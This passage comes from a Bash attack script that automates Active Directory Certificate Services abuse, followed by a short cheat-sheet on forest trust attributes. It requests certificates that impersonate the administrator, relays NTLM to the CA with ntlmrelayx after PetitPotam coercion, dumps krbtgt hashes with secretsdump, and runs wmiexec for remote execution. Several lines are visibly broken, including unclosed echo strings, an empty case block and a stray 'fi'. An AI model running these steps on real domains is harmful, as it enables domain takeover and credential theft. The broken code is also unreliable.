elif have certipy-ad; then CERTIPY="certipy-ad"
else CERTIPY="certipy"
fi

CREDS=()
build_creds() {
    if [ -n "$PASS" ]; then
        CREDS=(-u "$USER@$DOMAIN" -p "$PASS")
    elif [ -n "$NTHASH" ]; then
        CREDS=(-u "$USER@$DOMAIN" -hashes ":$NTHASH")
    else
        CREDS=(-u "$USER@$DOMAIN" -p "PASS")
    fi
}

creds_fragment() {
    if [ -n "$PASS" ]; then
        printf -- "-u '%s@%s' -p '%s'" "$USER" "$DOMAIN" "$PASS"
    elif [ -n "$NTHASH" ]; then
        printf -- "-u '%s@%s' -hashes ':%s'" "$USER" "$DOMAIN" "$NTHASH"
    else
        printf -- "-u '%s@%s' -p 'PASS'" "$USER" "$DOMAIN"
    fi
}

require() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN)  [ -z "$DOMAIN" ]  && missing="$missing -d" ;;
            DC)      [ -z "$DC" ]      && missing="$missing -s" ;;
            CAHOST)  [ -z "$CAHOST" ]  && missing="$missing -c" ;;
            CANAME)  [ -z "$CANAME" ]  && missing="$missing -n" ;;
            TEMPLATE)[ -z "$TEMPLATE" ] && missing="$missing -t" ;;
            USER)    [ -z "$USER" ]    && missing="$missing -u" ;;
            PFX)     [ -z "$PFX" ]     && missing="$missing -P" ;;
            LHOST)   [ -z "$LHOST" ]   && missing="$missing -l" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_deps() {
    local ok=1
    if [ "$CERTIPY" = "certipy" ] && ! have certipy; then
        ok=0
    else
        info "certipy     : $CERTIPY ($(command -v "$CERTIPY"))"
    fi
    for t in impacket-ntlmrelayx impacket-petitpotam impacket-secretsdump openssl curl; do
            case "$t" in
            esac
            ok=0
        fi
    done
    echo
}

# ---------------------------------------------------------------------------
mode_find() {
    require DOMAIN DC USER
    build_creds
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -stdout
    echo
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -vulnerable -stdout
    echo
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -vulnerable -stdout > $LOOT/find-vuln.txt"
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -stdout > $LOOT/find-all.txt"
    echo
}

# ---------------------------------------------------------------------------
mode_req() {
    require DOMAIN DC CAHOST CANAME TEMPLATE USER
    [ -z "$UPN" ] && UPN="administrator@$DOMAIN"
    build_creds
    run $CERTIPY req "${CREDS[@]}" -ca "$CANAME" -target "$CAHOST" \
        -template "$TEMPLATE" -upn "$UPN" -dc-ip "$DC" -out "$OUT"
    echo
    echo
}

# ---------------------------------------------------------------------------
mode_auth() {
    require PFX DOMAIN DC
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    echo "impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH $DOMAIN/Administrator@$DC"
    echo "impacket-wmiexec $DOMAIN/Administrator@$DC -hashes :NTHASH"
    echo
    echo "$CERTIPY auth -pfx $PFX -username administrator -domain $DOMAIN -dc-ip $DC"
    echo
}

# ---------------------------------------------------------------------------
mode_pfx2ccache() {
    require PFX DOMAIN DC
    echo "openssl pkcs12 -in $PFX -out ${PFX%.*}.pem -nodes -passin pass:"
    echo "openssl x509 -in ${PFX%.*}.pem -noout -text | head -40
    echo
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    echo "export KRB5CCNAME=administrator.ccache"
    echo "klist -e"
    echo "impacket-secretsdump -k -no-pass $DC"
    echo "impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC"
    echo
}

# ---------------------------------------------------------------------------
mode_relay() {
    require CAHOST
    [ -z "$VICTIM" ] && VICTIM="$DC"
    [ -z "$TEMPLATE" ] && TEMPLATE="Machine"
    [ -z "$LHOST" ] && LHOST="LHOST"
    [ -z "$VICTIM" ] && VICTIM="TARGET"
    [ -z "$DOMAIN" ] && DOMAIN="DOMAIN"
    local url="http://$CAHOST/certsrv/certfnsh.asp"

    echo "
    echo "curl -s -o /dev/null -w '%{http_code}\\n' http://$CAHOST/certsrv/"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' https://$CAHOST/certsrv/ -k"
    echo

    echo "
    run impacket-ntlmrelayx -t "$url" --adcs --template "$TEMPLATE" -smb2support -l "$LOOT"
    echo

    echo "
    if [ -n "$USER" ]; then
        run impacket-petitpotam -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" "$LHOST" "$VICTIM"
    else
        echo "impacket-petitpotam -u USER@$DOMAIN -p 'PASS' -dc-ip $DC LHOST $VICTIM"
    fi
    echo "
    echo "python3 /opt/PetitPotam/PetitPotam.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo "python3 /opt/dementor/dementor.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo

    echo
}

# ---------------------------------------------------------------------------
case "$MODE" in
    deps)       mode_deps ;;
    find)       mode_find ;;
    req)        mode_req ;;
    auth)       mode_auth ;;
    pfx2ccache) mode_pfx2ccache ;;
    relay)      mode_relay ;;
    all)        mode_deps; mode_find; mode_req; mode_auth ;;
esac

````

## Trust cheat-sheet (scenario 53)

**trustDirection**: 0 disabled · 1 inbound · 2 outbound · 3 bidirectional

**trustAttributes**: `0x20` WITHIN_FOREST (Extra SID usually works) · `0x08` FOREST_TRANSITIVE · `0x04` QUARANTINED · `0x400` TREAT_AS_EXTERNAL (filtering on)

Verify Extra SID with `klist -e` then `impacket-secretsdump -k -no-pass <root-DC-FQDN>`.
